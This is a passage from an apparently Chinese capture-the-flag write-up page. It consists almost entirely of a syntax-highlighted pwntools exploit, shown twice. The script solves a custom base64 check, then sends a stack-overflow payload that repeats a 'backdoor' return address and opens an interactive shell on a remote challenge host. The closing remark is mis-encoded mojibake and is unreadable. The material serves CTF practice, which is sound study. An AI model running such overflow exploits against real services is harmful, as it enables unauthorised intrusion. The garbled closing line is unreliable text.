decode</span><span style="color:#2993a3">(</span><span style="color:#393A34">input</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    n0</span><span style="color:#999999">=</span><span style="color:#393A34">s</span><span style="color:#999999">.</span><span style="color:#393A34">find</span><span style="color:#2993a3">(</span><span style="color:#998418">input</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    n1</span><span style="color:#999999">=</span><span style="color:#393A34">s</span><span style="color:#999999">.</span><span style="color:#393A34">find</span><span style="color:#2993a3">(</span><span style="color:#998418">input</span><span style="color:#1e754f">[</span><span style="color:#2F798A">1</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    n2</span><span style="color:#999999">=</span><span style="color:#393A34">s</span><span style="color:#999999">.</span><span style="color:#393A34">find</span><span style="color:#2993a3">(</span><span style="color:#998418">input</span><span style="color:#1e754f">[</span><span style="color:#2F798A">2</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    n3</span><span style="color:#999999">=</span><span style="color:#393A34">s</span><span style="color:#999999">.</span><span style="color:#393A34">find</span><span style="color:#2993a3">(</span><span style="color:#998418">input</span><span style="color:#1e754f">[</span><span style="color:#2F798A">3</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#998418">    print</span><span style="color:#2993a3">(</span><span style="color:#393A34">n0</span><span style="color:#999999">,</span><span style="color:#393A34">n1</span><span style="color:#999999">,</span><span style="color:#393A34">n2</span><span style="color:#999999">,</span><span style="color:#393A34">n3</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    v3_0_6</span><span style="color:#999999">=</span><span style="color:#393A34">n3</span><br><span style="color:#393A34">    v3_6_8</span><span style="color:#999999">=</span><span style="color:#393A34">n2</span><span style="color:#AB5959">%</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#AB5959">**</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    v3</span><span style="color:#999999">=</span><span style="color:#393A34">v3_0_6</span><span style="color:#AB5959">+</span><span style="color:#2993a3">(</span><span style="color:#393A34">v3_6_8</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A">6</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    v2_0_4</span><span style="color:#999999">=</span><span style="color:#393A34">n2</span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A">2</span><br><span style="color:#393A34">    v2_4_8</span><span style="color:#999999">=</span><span style="color:#393A34">n1</span><span style="color:#AB5959">%</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#AB5959">**</span><span style="color:#2F798A">4</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    v2</span><span style="color:#999999">=</span><span style="color:#393A34">v2_0_4</span><span style="color:#AB5959">+</span><span style="color:#2993a3">(</span><span style="color:#393A34">v2_4_8</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A">4</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    v1_0_2</span><span style="color:#999999">=</span><span style="color:#393A34">n1</span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A">4</span><br><span style="color:#393A34">    v1_2_8</span><span style="color:#999999">=</span><span style="color:#393A34">n0</span><br><span style="color:#393A34">    v1</span><span style="color:#999999">=</span><span style="color:#393A34">v1_0_2</span><span style="color:#AB5959">+</span><span style="color:#2993a3">(</span><span style="color:#393A34">v1_2_8</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#998418">    print</span><span style="color:#2993a3">(</span><span style="color:#393A34">v1</span><span style="color:#999999">,</span><span style="color:#393A34">v2</span><span style="color:#999999">,</span><span style="color:#393A34">v3</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> long_to_bytes</span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">v1</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A">16</span><span style="color:#1e754f">)</span><span style="color:#AB5959">+</span><span style="color:#1e754f">(</span><span style="color:#393A34">v2</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A">8</span><span style="color:#1e754f">)</span><span style="color:#AB5959">+</span><span style="color:#393A34">v3</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> decode1</span><span style="color:#2993a3">(</span><span style="color:#393A34">b</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#A0ADA0">    # ret=[]</span><br><span style="color:#393A34">    ret </span><span style="color:#999999">=</span><span style="color:#B5695977"> ""</span><br><span style="color:#1E754F">    for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#998418">len</span><span style="color:#1e754f">(</span><span style="color:#393A34">b</span><span style="color:#1e754f">)</span><span style="color:#AB5959">//</span><span style="color:#2F798A">3</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">        a1</span><span style="color:#999999">=</span><span style="color:#2993a3">(</span><span style="color:#393A34">b</span><span style="color:#1e754f">[</span><span style="color:#2F798A">3</span><span style="color:#AB5959">*</span><span style="color:#393A34">i</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        a2</span><span style="color:#999999">=</span><span style="color:#2993a3">(</span><span style="color:#393A34">b</span><span style="color:#1e754f">[</span><span style="color:#2F798A">3</span><span style="color:#AB5959">*</span><span style="color:#393A34">i</span><span style="color:#AB5959">+</span><span style="color:#2F798A">1</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        a3</span><span style="color:#999999">=</span><span style="color:#2993a3">(</span><span style="color:#393A34">b</span><span style="color:#1e754f">[</span><span style="color:#2F798A">3</span><span style="color:#AB5959">*</span><span style="color:#393A34">i</span><span style="color:#AB5959">+</span><span style="color:#2F798A">2</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#998418">        print</span><span style="color:#2993a3">(</span><span style="color:#393A34">a1</span><span style="color:#999999">,</span><span style="color:#393A34">a2</span><span style="color:#999999">,</span><span style="color:#393A34">a3</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        v3</span><span style="color:#999999">=</span><span style="color:#393A34">a3</span><span style="color:#AB5959">&#x26;0b</span><span style="color:#2F798A">111111</span><br><span style="color:#393A34">        v2</span><span style="color:#999999">=</span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">a3</span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A">6</span><span style="color:#1e754f">)</span><span style="color:#AB5959">+</span><span style="color:#1e754f">(</span><span style="color:#a65e2b">(</span><span style="color:#a13865">(</span><span style="color:#393A34">a2</span><span style="color:#AB5959">&#x26;0b</span><span style="color:#2F798A">111111</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A">2</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#AB5959">&#x26;0b</span><span style="color:#2F798A">111111</span><br><br><span style="color:#393A34">        v1</span><span style="color:#999999">=</span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">a2</span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A">4</span><span style="color:#1e754f">)</span><span style="color:#AB5959">+</span><span style="color:#1e754f">(</span><span style="color:#a65e2b">(</span><span style="color:#393A34">a1</span><span style="color:#AB5959">&#x26;</span><span style="color:#2F798A">3</span><span style="color:#a65e2b">)</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A">4</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#AB5959">&#x26;0b</span><span style="color:#2F798A">111111</span><br><span style="color:#393A34">        v0</span><span style="color:#999999">=</span><span style="color:#2993a3">(</span><span style="color:#393A34">a1</span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><span style="color:#AB5959">&#x26;0b</span><span style="color:#2F798A">111111</span><br><span style="color:#393A34">        ret</span><span style="color:#999999">+=</span><span style="color:#393A34"> s</span><span style="color:#2993a3">[</span><span style="color:#393A34">v0</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> s</span><span style="color:#2993a3">[</span><span style="color:#393A34">v1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> s</span><span style="color:#2993a3">[</span><span style="color:#393A34">v2</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> s</span><span style="color:#2993a3">[</span><span style="color:#393A34">v3</span><span style="color:#2993a3">]</span><br><span style="color:#998418">        print</span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">ret</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    return</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">ret</span><span style="color:#2993a3">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">: </span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">res </span><span style="color:#999999">=</span><span style="color:#393A34"> decode</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">> </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> res</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">backdoor </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">401711</span><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">qAqAbbbb</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> decode1</span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#a65e2b">(</span><span style="color:#393A34">backdoor</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 32</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> sys </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> argv</span><br><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> base64</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> Crypto</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">Util</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">number </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> long_to_bytes</span><br><br><span style="color:#DBD7CAEE">proc </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">./challenge</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">binary </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> proc</span><br><span style="color:#DBD7CAEE">elf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">173.33.5.40</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 9999</span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> if</span><span style="color:#DBD7CAEE"> argv</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">'</span><span style="color:#4D9375"> else</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">G</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">attach</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">s</span><span style="color:#666666">=</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><span style="color:#C98A7D77">'</span><br><span style="color:#758575DD"># h=process("/home/l0fxxs/ctf/game/shemsai/mycode/challenge")</span><br><span style="color:#CB7676">def</span><span style="color:#80A665"> decode</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">input</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    n0</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">s</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">find</span><span style="color:#5eaab5">(</span><span style="color:#B8A965">input</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    n1</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">s</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">find</span><span style="color:#5eaab5">(</span><span style="color:#B8A965">input</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    n2</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">s</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">find</span><span style="color:#5eaab5">(</span><span style="color:#B8A965">input</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">2</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    n3</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">s</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">find</span><span style="color:#5eaab5">(</span><span style="color:#B8A965">input</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">3</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#B8A965">    print</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">n0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">n1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">n2</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">n3</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    v3_0_6</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">n3</span><br><span style="color:#DBD7CAEE">    v3_6_8</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">n2</span><span style="color:#CB7676">%</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#CB7676">**</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    v3</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">v3_0_6</span><span style="color:#CB7676">+</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">v3_6_8</span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91">6</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    v2_0_4</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">n2</span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91">2</span><br><span style="color:#DBD7CAEE">    v2_4_8</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">n1</span><span style="color:#CB7676">%</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#CB7676">**</span><span style="color:#4C9A91">4</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    v2</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">v2_0_4</span><span style="color:#CB7676">+</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">v2_4_8</span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91">4</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    v1_0_2</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">n1</span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91">4</span><br><span style="color:#DBD7CAEE">    v1_2_8</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">n0</span><br><span style="color:#DBD7CAEE">    v1</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">v1_0_2</span><span style="color:#CB7676">+</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">v1_2_8</span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#B8A965">    print</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">v1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">v2</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">v3</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> long_to_bytes</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">v1</span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91">16</span><span style="color:#4d9375">)</span><span style="color:#CB7676">+</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">v2</span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91">8</span><span style="color:#4d9375">)</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">v3</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> decode1</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">b</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#758575DD">    # ret=[]</span><br><span style="color:#DBD7CAEE">    ret </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> ""</span><br><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#B8A965">len</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">b</span><span style="color:#4d9375">)</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">3</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        a1</span><span style="color:#666666">=</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">b</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">3</span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">i</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        a2</span><span style="color:#666666">=</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">b</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">3</span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">i</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        a3</span><span style="color:#666666">=</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">b</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">3</span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">i</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">2</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#B8A965">        print</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">a1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">a2</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">a3</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        v3</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">a3</span><span style="color:#CB7676">&#x26;0b</span><span style="color:#4C9A91">111111</span><br><span style="color:#DBD7CAEE">        v2</span><span style="color:#666666">=</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">a3</span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91">6</span><span style="color:#4d9375">)</span><span style="color:#CB7676">+</span><span style="color:#4d9375">(</span><span style="color:#d4976c">(</span><span style="color:#d9739f">(</span><span style="color:#DBD7CAEE">a2</span><span style="color:#CB7676">&#x26;0b</span><span style="color:#4C9A91">111111</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91">2</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#CB7676">&#x26;0b</span><span style="color:#4C9A91">111111</span><br><br><span style="color:#DBD7CAEE">        v1</span><span style="color:#666666">=</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">a2</span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91">4</span><span style="color:#4d9375">)</span><span style="color:#CB7676">+</span><span style="color:#4d9375">(</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">a1</span><span style="color:#CB7676">&#x26;</span><span style="color:#4C9A91">3</span><span style="color:#d4976c">)</span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91">4</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#CB7676">&#x26;0b</span><span style="color:#4C9A91">111111</span><br><span style="color:#DBD7CAEE">        v0</span><span style="color:#666666">=</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">a1</span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><span style="color:#CB7676">&#x26;0b</span><span style="color:#4C9A91">111111</span><br><span style="color:#DBD7CAEE">        ret</span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> s</span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">v0</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> s</span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">v1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> s</span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">v2</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> s</span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">v3</span><span style="color:#5eaab5">]</span><br><span style="color:#B8A965">        print</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">ret</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    return</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">ret</span><span style="color:#5eaab5">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">: </span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">res </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> decode</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> drop</span><span style="color:#666666">=</span><span style="color:#4D9375">True</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">> </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> res</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">backdoor </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">401711</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">qAqAbbbb</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> decode1</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">backdoor</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 32</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<p>ä¸Šé¢è¿™ä¸ªé¢˜è´¹å¤ªä¹…æ—¶é—´äº†ï¼Œè¿™ç§æ”¿æ²»æ¯”èµ›æ—¶é—´æœ¬æ¥å°±çŸ­ï¼Œåšåˆ°è¿™ä¸ª noleak æ ˆæº¢å‡ºæ—¶æ—¶é—´å·²ç»ä¸å¤ªå¤Ÿäº†ã€‚</p>
